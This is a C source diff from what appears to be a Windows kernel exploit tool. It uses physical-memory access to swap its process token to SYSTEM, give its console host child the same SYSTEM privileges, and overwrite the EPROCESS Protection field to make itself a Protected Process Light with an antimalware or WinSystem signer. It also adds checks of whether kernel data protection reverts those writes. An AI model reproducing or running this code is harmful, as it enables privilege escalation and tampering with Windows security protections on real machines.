@@ -482,6 +482,15 @@ static int RunBody() {
     // Primary token first: this is what makes the *process* SYSTEM. The thread
     // impersonation below is a fallback for when the swap is refused.
     SetProcessSystemToken(systemCr3, &kOffsets);
+
+    // The console host was spawned by CSRSS back in EnsureConsole(), long
+    // before any of this ran, so it is still running as the original account.
+    // If we own the console, bring its host up to the same state as us.
+    if (GetConsoleWindow()) {
+        if (!MatchChildToSystem(systemCr3, &kOffsets, L"conhost.exe"))
+            printf("[-] No conhost child found to match (fine if run from a terminal)\n");
+    }
+
     if (!ImpersonateSystem())
         printf("[-] Failed to impersonate SYSTEM on this thread\n");
 
@@ -491,24 +500,7 @@ static int RunBody() {
         if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEprocessVA)) {
             printf("[*] Our EPROCESS: 0x%llX (Protection off 0x%X)\n",
                    ourEprocessVA, kOffsets.Protection);
-            ULONG64 protPA = WindowVirtToPhys(systemCr3, ourEprocessVA + kOffsets.Protection);
-            if (protPA) {
-                BYTE before = WindowRead8(protPA);
-                BYTE ppl = 0x31; // PsProtectedTypeLight | PsProtectedSignerAntimalware
-                WindowWriteBuffer(protPA, &ppl, 1);
-                // Read back immediately: a readback of 0x31 means the write
-                // landed and something reverted it later (kernel data
-                // protection), while 0x00 means the store never took effect.
-                BYTE after = WindowRead8(protPA);
-                if (after == ppl) {
-                    printf("[+] PPL set (0x%02X, was 0x%02X)\n", after, before);
-                } else {
-                    printf("[-] PPL write did not stick (0x%02X -> wanted 0x%02X) "
-                           "- the field is write protected\n", before, ppl);
-                }
-            } else {
-                printf("[-] PPL: Protection (off 0x%X) did not translate\n", kOffsets.Protection);
-            }
+            WindowSetProcessPpl(systemCr3, &kOffsets, ourEprocessVA, PPL_FULL_WINSYSTEM);
         } else {
             printf("[-] PPL: could not locate our EPROCESS\n");
         }
@@ -535,8 +527,22 @@ static int RunBody() {
             BYTE level = 0;
             ULONG len = 0;
             NTSTATUS s = NtQIP(GetCurrentProcess(), 61, &level, sizeof(level), &len);
-            printf("[%c] PPL: 0x%02X\n", (s == 0 && level == 0x31) ? '+' : '-', level);
+            printf("[%c] PPL: 0x%02X%s\n", (s == 0 && level == PPL_FULL_WINSYSTEM) ? '+' : '-',
+                   level,
+                   (s == 0 && level == PPL_FULL_WINSYSTEM) ? "" : "  (wanted 0x44)");
+            printf("    raw Protection now: 0x%02X\n", level);
         }
+    }
+
+    // Re-read the bytes at the end of the run. If they differ from what was
+    // written, something in between rewrote them.
+    {
+        ULONG64 ourEproc = 0;
+        if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEproc)) {
+            printf("[*] raw Protection: ours 0x%02X\n",
+                   WindowGetProcessProtection(systemCr3, &kOffsets, ourEproc));
+        }
+        ReportChildProtection(systemCr3, &kOffsets, L"conhost.exe");
     }
 
     {
